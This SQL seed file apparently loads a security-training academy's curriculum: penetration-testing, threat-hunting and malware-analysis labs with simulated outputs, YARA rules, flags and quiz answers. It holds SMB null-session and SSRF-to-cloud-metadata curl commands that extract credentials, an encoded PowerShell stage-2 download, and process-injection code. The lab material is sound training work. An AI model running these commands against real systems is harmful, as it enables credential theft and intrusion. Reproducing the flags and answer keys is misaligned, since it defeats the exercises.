-- =============================================================================
-- Migration 0002: Comprehensive Curriculum Seed for Phoenix Labs Academy
-- Fully seeds 3 tracks and 7 complete modules across Pentest, Hunting, Malware & Quizzes
-- =============================================================================

INSERT INTO tracks (id, slug, title, subtitle, description, order_index) VALUES
('track-pentest', 'penetration-testing', 'Penetration Testing', 'Attack Surface & Exploitation', 'Transition from systems administration to offensive methodology: reconnaissance, enumeration, exploitation, and privilege escalation.', 1),
('track-hunting', 'threat-hunting', 'Threat Hunting', 'Hypothesis-Driven Detection', 'Move beyond signature alerts: analyze Sysmon, EDR telemetry, and WMI persistence to uncover Living-off-the-Land adversaries.', 2),
('track-malware', 'malware-analysis', 'Malware Engineering', 'Discovery, Blast Chamber, RE & Remediation', 'End-to-end malware lifecycle: discovery triage, isolated blast-chamber detonation, reverse engineering, and YARA remediation.', 3);

INSERT INTO modules (id, track_id, slug, title, difficulty, order_index, estimated_minutes, theory_json, lab_type, lab_briefing, lab_config_json, expected_flag, hint) VALUES
(
  'mod-pt-101',
  'track-pentest',
  'service-enumeration-fundamentals',
  '101: From Port States to Service Misconfigurations',
  'Fundamentals',
  1,
  15,
  '[{"heading":"The Systems-to-Offensive Mindset Shift","body":"As an experienced technologist, you use port checks to verify service availability. In Penetration Testing, an open port is merely the entry point—our objective is to interrogate how the daemon identifies itself and whether anonymous or misconfigured sub-protocols are exposed."},{"heading":"SMB Null Sessions & Staging Leakage","body":"Server Message Block (SMB on TCP/445) frequently bridges Windows and Linux environments via Samba. When improperly secured (e.g., guest ok = yes or null session allowed), unauthenticated clients can enumerate shares, users, and internal deployment drops without domain credentials."},{"heading":"Lab Methodology","body":"1. Fingerprint open services with nmap -sV\\n2. List SMB shares anonymously with smbclient -L\\n3. Inspect the dev-staging share and retrieve deploy.env"}]',
  'terminal',
  'Enumerate open services on 10.10.14.22, inspect the exposed SMB shares using anonymous authentication (-N), and submit the deployment flag inside deploy.env.',
  '{"target_ip":"10.10.14.22","quick_commands":["nmap -sV 10.10.14.22","smbclient -L //10.10.14.22 -N","smbclient //10.10.14.22/dev-staging -N -c \"ls\"","smbclient //10.10.14.22/dev-staging -N -c \"get deploy.env -\""],"commands":{"nmap -sV 10.10.14.22":"PORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 9.2p1 Debian\n445/tcp open  microsoft-ds Samba smbd 4.17.12-Debian\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|_  message_signing: disabled","smbclient -L //10.10.14.22 -N":"Anonymous login successful\n\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tdev-staging     Disk      Automated CI Deployment Drop\n\tIPC$            IPC       IPC Service (Samba 4.17.12)\n\nSMB1 disabled -- no workgroup available","smbclient //10.10.14.22/dev-staging -N -c \"ls\"":"Anonymous login successful\n  .                                   D        0  Fri Oct 16 14:15:02 2026\n  ..                                  D        0  Thu Oct 15 09:22:18 2026\n  build-runner.sh                     N     1240  Fri Oct 16 14:18:44 2026\n  deploy.env                          N      142  Fri Oct 16 14:20:11 2026\n\n\t\t40960000 blocks of size 1024. 28912300 blocks available","smbclient //10.10.14.22/dev-staging -N -c \"get deploy.env -\"":"Anonymous login successful\n# Automated CI Deployment Secret Drop\nAPP_ENV=staging\nCI_BUILD_ID=98214\nDEPLOY_TOKEN=FLAG{SMB_NULL_SESSION_EXPOSED}\nDB_HOST=10.10.14.100"}}',
  'FLAG{SMB_NULL_SESSION_EXPOSED}',
  'Run the four quick commands in sequence, ending with smbclient //10.10.14.22/dev-staging -N -c "get deploy.env -".'
),
(
  'mod-pt-201',
  'track-pentest',
  'ssrf-cloud-metadata-pivoting',
  '201: SSRF to Cloud IMDS Credential Extraction',
  'Intermediate',
  2,
  25,
  '[{"heading":"Why SSRF Bypasses Perimeter Firewalls","body":"In modern hybrid cloud architectures, perimeter WAFs and security groups block external access to internal microservices. Server-Side Request Forgery (SSRF) forces the backend application itself to forge HTTP requests from inside the trusted boundary."},{"heading":"Targeting the Instance Metadata Service (169.254.169.254)","body":"Cloud providers expose an Instance Metadata Service (IMDS) on the link-local address 169.254.169.254. If a proxy or image-fetching endpoint does not strictly validate URLs, an attacker can extract short-lived IAM session credentials directly from the host."}]',
  'terminal',
  'The internal webhook proxy at http://10.10.14.55:8080/proxy?url= fetches remote status pages. Abuse the proxy to interrogate the AWS link-local IMDS (169.254.169.254) and exfiltrate the IAM Security Token flag.',
  '{"target_ip":"10.10.14.55","quick_commands":["curl -s \"http://10.10.14.55:8080/proxy?url=http://localhost:8080/health\"","curl -s \"http://10.10.14.55:8080/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"","curl -s \"http://10.10.14.55:8080/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/secops-ec2-role\""],"commands":{"curl -s \"http://10.10.14.55:8080/proxy?url=http://localhost:8080/health\"":"{\"status\":\"ok\",\"service\":\"internal-webhook-proxy\",\"uptime\":84291}","curl -s \"http://10.10.14.55:8080/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"":"secops-ec2-role","curl -s \"http://10.10.14.55:8080/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/secops-ec2-role\"":"{\n  \"Code\": \"Success\",\n  \"LastUpdated\": \"2026-10-16T19:30:11Z\",\n  \"Type\": \"AWS-HMAC\",\n  \"AccessKeyId\": \"ASIAVEXAMPLEKEY1234\",\n  \"SecretAccessKey\": \"v8xK9LmPqR3tYwZ1aBcDeFgHiJkLmNoPqRsTuVwX\",\n  \"Token\": \"FLAG{IMDS_SSRF_ROLE_COMPROMISED}\",\n  \"Expiration\": \"2026-10-17T01:30:11Z\"\n}"}}',
  'FLAG{IMDS_SSRF_ROLE_COMPROMISED}',
  'Query the secops-ec2-role metadata endpoint via the /proxy?url= parameter and submit the Token value.'
),
(
  'mod-th-101',
  'track-hunting',
  'lotl-powershell-hunting',
  '101: Hunting Encoded Living-off-the-Land (LotL) Execution',
  'Fundamentals',
  1,
  20,
  '[{"heading":"Why Signature Alerts Miss LotL","body":"Adversaries rarely drop noisy custom binaries during initial execution when native Windows binaries (powershell.exe, rundll32.exe, certutil.exe) are already present and trusted on every endpoint."},{"heading":"Pivoting on Sysmon Event ID 1 (Process Creation)","body":"Threat hunters focus on behavioral anomalies rather than static file hashes:\\n- Parent-Child Anomalies: Normal productivity apps (WINWORD.EXE, EXCEL.EXE) should never spawn command-line shells.\\n- Command-Line Arguments: The -EncodedCommand (-Enc) switch accepts UTF-16LE Base64 strings to hide script logic from casual inspection."}]',
  'siem',
  'Filter the Sysmon Event ID 1 telemetry stream to locate the obfuscated PowerShell execution spawned by WINWORD.EXE. Decode the UTF-16LE Base64 payload and submit the hidden C2 stage 2 URL.',
  '{"logs":[{"timestamp":"2026-10-16T18:01:12Z","host":"WKSTN-FIN-04","event_id":1,"parent_image":"C:\\\\Windows\\\\System32\\\\services.exe","image":"C:\\\\Windows\\\\System32\\\\svchost.exe","command_line":"svchost.exe -k netsvcs -p -s Schedule"},{"timestamp":"2026-10-16T18:03:05Z","host":"WKSTN-FIN-04","event_id":1,"parent_image":"C:\\\\Windows\\\\explorer.exe","image":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE","command_line":"\"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\" /n \"C:\\\\Users\\\\jdoe\\\\Downloads\\\\Invoice_Q3_9918.docm\""},{"timestamp":"2026-10-16T18:04:49Z","host":"WKSTN-FIN-04","event_id":1,"parent_image":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE","image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","command_line":"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADkALgA5ADkALwBzAHQAYQBnAGUAMgAuAHAAcwAxAA=="},{"timestamp":"2026-10-16T18:06:02Z","host":"WKSTN-FIN-04","event_id":1,"parent_image":"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe","image":"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe","command_line":"chrome.exe --type=renderer --lang=en-US"}]}',
  'http://10.10.19.99/stage2.ps1',
  'Filter by powershell or WINWORD, click Decode Base64 on the -Enc payload, and submit the resulting URL.'
),
(
  'mod-th-201',
  'track-hunting',
  'wmi-persistence-consumer-bindings',
  '201: Hunting Fileless WMI Event Subscription Persistence',
  'Intermediate',
  2,
  25,
  '[{"heading":"Beyond Registry Run Keys","body":"Intermediate adversaries avoid HKLM\\...\\CurrentVersion\\Run because modern EDR agents heavily monitor registry autoruns. Instead, they weaponize Windows Management Instrumentation (WMI) event subscriptions to execute arbitrary payloads in response to system triggers without leaving files in Startup folders."},{"heading":"The WMI Persistence Triad (Sysmon Events 19, 20, 21)","body":"1. __EventFilter (Event ID 19): Defines the trigger condition (e.g., system uptime > 300s or specific logon).\\n2. __EventConsumer (Event ID 20): Defines the action (e.g., CommandLineEventConsumer executing rundll32.exe).\\n3. __FilterToConsumerBinding (Event ID 21): Glues the trigger and the action together."}]',
  'siem',
  'Inspect the Sysmon WMI telemetry (Events 19, 20, 21) across domain controller SRV-AD-02. Identify the malicious CommandLineEventConsumer and submit the exact ConsumerName value.',
  '{"logs":[{"timestamp":"2026-10-16T19:12:01Z","host":"SRV-AD-02","event_id":19,"parent_image":"WmiEventFilter","image":"ROOT\\\\subscription:__EventFilter","command_line":"FilterName=\"SCM_Health_Trigger\" Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System''\""},{"timestamp":"2026-10-16T19:12:04Z","host":"SRV-AD-02","event_id":20,"parent_image":"WmiEventConsumer","image":"ROOT\\\\subscription:CommandLineEventConsumer","command_line":"ConsumerName=\"SysHealthUpdaterC2\" Destination=\"rundll32.exe C:\\\\ProgramData\\\\uso_cache.dat,DllRegisterServer\""},{"timestamp":"2026-10-16T19:12:05Z","host":"SRV-AD-02","event_id":21,"parent_image":"WmiFilterToConsumerBinding","image":"ROOT\\\\subscription:__FilterToConsumerBinding","command_line":"Consumer=\"CommandLineEventConsumer.Name=\\\"SysHealthUpdaterC2\\\"\" Filter=\"__EventFilter.Name=\\\"SCM_Health_Trigger\\\"\""}]}',
  'SysHealthUpdaterC2',
  'Look at Sysmon Event ID 20 (CommandLineEventConsumer) and submit the ConsumerName value.'
),
(
  'mod-mw-101',
  'track-malware',
  'blast-chamber-triage-and-iat',
  '101: Discovery, Blast Chamber Detonation & IAT Triage',
  'Fundamentals',
  1,
  25,
  '[{"heading":"The 4-Stage Malware Engineering Lifecycle","body":"1. Discovery: Flagging anomalous binaries via section entropy (packed code), unsigned PE headers, or suspicious delivery paths.\\n2. Blast Chamber Detonation: Running the sample in an instrumented sandbox to observe child processes, dropped artifacts, and network beacons.\\n3. Reverse Engineering: Decompiling routines in Ghidra/IDA to understand algorithms and config structures.\\n4. Remediation: Authoring YARA detection signatures and automated containment rules."},{"heading":"Recognizing Process Injection in the IAT","body":"Before opening a disassembler, inspecting a PE file''s Import Address Table (IAT) reveals its capabilities. The presence of VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread strongly indicates remote code injection into a legitimate host process."}]',
  'hex_inspector',
  'Examine the static PE metadata, Blast Chamber detonation trace, and decompiled routine for updater_svc.exe. Identify the external command-and-control (C2) domain contacted after injection.',
  '{"sample_name":"updater_svc.exe (SHA256: 9f86d081884c7d659a2feaa0c55ad015)","entropy":"7.42 (High - Packed .rsrc section)","imports":["KERNEL32.dll!OpenProcess","KERNEL32.dll!VirtualAllocEx","KERNEL32.dll!WriteProcessMemory","KERNEL32.dll!CreateRemoteThread","WININET.dll!InternetOpenUrlA"],"strings":["Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run","Global\\\\Mtx_Sync_881","Mozilla/5.0 (Windows NT 10.0; Win64; x64)","https://telemetry-cdn-check.net/gate.php"],"sandbox_trace":"[00:01.12] EXEC: Spawned updater_svc.exe (PID 4120)\n[00:01.45] SYNC: Created Mutex \"Global\\\\Mtx_Sync_881\"\n[00:02.08] INJECT: Allocated 4096 bytes RWX in explorer.exe (PID 1840)\n[00:02.15] INJECT: Wrote shellcode to explorer.exe @ 0x02AB0000\n[00:02.20] THREAD: CreateRemoteThread on explorer.exe -> entry 0x02AB0010\n[00:03.19] NET: DNS Query A -> telemetry-cdn-check.net -> IP 198.51.100.44\n[00:03.35] NET: HTTPS GET https://telemetry-cdn-check.net/gate.php (200 OK)","decompiled_c":"int __cdecl main() {\n  HANDLE hMutex = CreateMutexA(NULL, TRUE, \"Global\\\\\\\\Mtx_Sync_881\");\n  if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;\n  DWORD pid = FindProcessByName(\"explorer.exe\");\n  HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n  LPVOID rwx = VirtualAllocEx(hProc, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n  WriteProcessMemory(hProc, rwx, encrypted_stage, 0x1000, NULL);\n  CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)rwx, NULL, 0, NULL);\n  return 0;\n}","remediation_yara":"rule Malware_Win32_UpdaterSvc_Injector {\n  meta:\n    author = \"Phoenix Labs Academy\"\n    severity = \"Critical\"\n  strings:\n    $mutex = \"Global\\\\\\\\Mtx_Sync_881\"\n    $c2 = \"telemetry-cdn-check.net\"\n  condition:\n    uint16(0) == 0x5A4D and ($mutex or $c2)\n}"}',
  'telemetry-cdn-check.net',
  'Inspect the Extracted Strings or Blast Chamber Detonation tab and submit the domain name.'
),
(
  'mod-mw-201',
  'track-malware',
  'xor-config-reverse-engineering-remediation',
  '201: Reverse Engineering XOR-Obfuscated Configs & Remediation',
  'Intermediate',
  2,
  30,
  '[{"heading":"Defeating Static String Extraction","body":"To prevent analysts from running strings on a binary to extract C2 domains and registry keys, malware authors encrypt configuration blocks using simple byte operations like single-byte XOR or RC4."},{"heading":"Decompilation & Automated Remediation","body":"By examining the decompiled loop in Ghidra or IDA, you can identify the XOR key constant, decode the configuration buffer, and craft an automated YARA signature that detects the decryption routine across binary variations."}]',
  'hex_inspector',
  'Switch to the Decompiled RE & YARA tab in the Malware Inspector. Analyze the decompiled XOR decryption function and submit the single-byte hex XOR key used to decrypt the C2 configuration.',
  '{"sample_name":"svc_host_helper.dll (SHA256: 4b227777d4dd1fc61c6f884f48641d02)","entropy":"6.89 (.data config encrypted)","imports":["ADVAPI32.dll!CreateServiceA","ADVAPI32.dll!StartServiceCtrlDispatcherA","WS2_32.dll!connect","KERNEL32.dll!VirtualProtect"],"strings":["[ENCRYPTED BLOB @ 0x10004020]: 32 3E 3A 29 05 39 35 28 3F 14 3E 36 36","ServiceDll","SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinDefendCoreSvc"],"sandbox_trace":"[00:00.40] EXEC: rundll32.exe svc_host_helper.dll,InstallSvc\n[00:00.85] MEM : Decrypting 64-byte configuration buffer @ 0x10004020\n[00:01.02] NET : Socket connect 192.0.2.77:4444 (ESTABLISHED)","decompiled_c":"void __fastcall DecryptConfig(uint8_t *buf, size_t len) {\n  // Single-byte XOR deobfuscation routine\n  const uint8_t xor_key = 0x5A;\n  for (size_t i = 0; i < len; i++) {\n    buf[i] ^= xor_key;\n  }\n}","remediation_yara":"rule Malware_Win32_SvcHostHelper_XOR {\n  meta:\n    description = \"Detects XOR 0x5A decryption loop in svc_host_helper\"\n  strings:\n    $xor_loop = { 8A 04 0A 34 5A 88 04 0A 41 49 75 F5 }\n  condition:\n    uint16(0) == 0x5A4D and $xor_loop\n}"}',
  '0x5A',
  'Open the Decompiled RE & YARA tab inside the lab pane and check the uint8_t xor_key constant (0x5A).'
),
(
  'mod-quiz-101',
  'track-pentest',
  'cross-domain-triage-checkpoint',
  'Quiz: SecOps & Triage Comprehension Checkpoint',
  'Fundamentals',
  3,
  10,
  '[{"heading":"Verifying Operational Intuition","body":"Real-world security operations require synthesizing offensive signals with defensive telemetry. This checkpoint evaluates your tactical comprehension of attack vectors, process parentage anomalies, and malware triage indicators before advancing to advanced lab exercises."}]',
  'quiz',
  'Answer the technical multiple-choice scenario questions below. Submit the final passing completion token to record your benchmark.',
  '{"questions":[{"id":"q1","prompt":"When inspecting Sysmon Event ID 1 telemetry, which of the following parent-child relationships represents an anomalous Living-off-the-Land (LotL) execution?","options":["services.exe spawning svchost.exe -k netsvcs","WINWORD.EXE spawning powershell.exe -Enc","explorer.exe spawning chrome.exe --type=renderer","svchost.exe spawning taskhostw.exe"],"answerIndex":1,"explanation":"Productivity applications like Word should never execute command shells directly."},{"id":"q2","prompt":"Which Import Address Table (IAT) trio strongly indicates remote process injection?","options":["OpenProcess, VirtualAllocEx, WriteProcessMemory","RegOpenKeyEx, RegSetValueEx, RegCloseKey","CreateFileA, ReadFile, CloseHandle","WSAStartup, socket, connect"],"answerIndex":0,"explanation":"Allocating and writing to remote virtual memory are standard primitives for injecting code into legitimate processes."},{"id":"q3","prompt":"In cloud environments, what is the significance of the 169.254.169.254 IP address in SSRF exploitation?","options":["Default gateway for DNS queries","Instance Metadata Service (IMDS) providing temporary IAM credentials","Subnet broadcast address for ARP poisoning","BGP routing endpoint for VPC peering"],"answerIndex":1,"explanation":"The link-local IMDS returns IAM role credentials when queried via SSRF from internal web services."}],"passing_token":"FLAG{SECOPS_COMPREHENSION_VALIDATED}"}',
  'FLAG{SECOPS_COMPREHENSION_VALIDATED}',
  'Answer all questions correctly in the quiz pane to generate the validation token.'
);
